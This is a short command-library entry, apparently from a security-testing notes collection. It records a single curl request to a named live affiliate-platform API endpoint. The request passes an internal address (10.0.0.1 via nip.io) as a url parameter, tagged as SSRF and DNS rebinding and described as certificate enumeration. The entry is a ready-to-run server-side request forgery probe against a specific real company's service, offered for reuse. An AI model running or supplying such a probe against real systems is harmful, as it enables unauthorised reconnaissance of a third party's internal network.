---
id: cmd-exness-get-nip-https
data: >-
  curl -X GET
  "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=https://10.0.0.1.nip.io"
tags:
  - ssrf
  - dns-rebinding
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.624Z'
verified: false
validated: true
submitted: true
---
# get-check-nip-io-https

## Command

```bash
curl -X GET "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=https://10.0.0.1.nip.io"
```

## Description

HTTPS variant for cert enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | HTTPS nip.io | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Cert mismatch error.

## Related

- [[commands/get-check-nip-io-http]]
